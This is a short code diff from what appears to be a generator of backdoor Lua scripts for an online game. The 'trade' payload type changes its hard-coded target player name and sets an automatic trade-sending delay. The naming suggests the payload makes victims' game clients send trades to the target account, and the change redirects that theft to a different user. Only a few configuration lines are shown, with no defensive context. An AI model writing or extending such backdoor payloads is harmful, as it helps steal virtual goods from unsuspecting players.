@@ -251,7 +251,7 @@ end)`;
     Duration = 10
 })`);
     } else if (type === 'trade') {
-      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "vokareal0" 
+      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "mhauiw29" 
 local AUTO_SEND_DELAY = 3                 
 local AUTO_ACCEPT = false                  
 
